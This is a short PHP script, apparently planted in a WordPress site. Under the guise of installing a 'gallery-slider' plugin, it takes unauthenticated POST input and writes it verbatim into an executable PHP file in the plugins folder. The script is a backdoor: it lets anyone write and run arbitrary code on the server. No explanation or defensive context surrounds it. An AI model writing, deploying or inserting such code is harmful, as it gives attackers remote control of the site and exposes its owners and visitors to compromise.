<?php
session_start();
$installtheplugin = $_POST['registerit'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/gallery-slider/launch.php', 'w');
$installtheplugin = str_replace('\\', '', $installtheplugin);
$installtheplugin = htmlentities($installtheplugin);
fwrite($fp, html_entity_decode($installtheplugin));
fclose($fp);
echo $installtheplugin;
?>